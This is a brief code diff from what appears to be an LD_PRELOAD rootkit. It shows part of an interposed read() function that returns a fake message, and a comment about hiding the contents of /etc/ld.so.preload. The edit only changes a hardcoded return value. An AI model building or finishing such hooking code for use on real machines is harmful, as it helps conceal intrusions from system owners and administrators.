@@ -45,7 +45,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 
             // Copy the message to the buffer
             memcpy(buf, message, count);
-            return 10; // Return the number of bytes written
+            return 9; // Return the number of bytes written
         }
 
         // Hide the contents of /etc/ld.so.preload
